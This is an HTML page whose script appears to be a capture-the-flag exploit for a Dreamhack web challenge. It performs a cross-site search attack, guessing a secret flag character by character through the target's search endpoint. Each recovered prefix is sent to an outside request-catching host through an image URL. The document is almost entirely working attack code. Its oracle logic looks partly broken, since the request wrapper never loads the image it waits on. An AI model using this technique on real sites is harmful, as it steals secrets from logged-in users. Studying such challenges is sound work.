<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {

            var img = document.getElementById('img');

            img.addEventListener('error', function() {
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 404) {
                            console.log('Image not found (404 Not Found)');
                            // 여기에서 404 오류를 처리하거나 필요한 작업을 수행할 수 있습니다.
                            return reject();
                        } else {
                            console.log('Other error:', xhr.status);
                            // 다른 종류의 오류를 처리할 수도 있습니다.
                            return resolve();
                        }
                    }
                };

                xhr.open('GET', img.src, true);
                xhr.send();
            });            
        });
    }
    async function search(query) {
        try {
            await req(
              `https://host3.dreamhack.games:17589/search?keyword=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }
    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{";
        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://ffhxdeq.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }
    exploit();
</script>
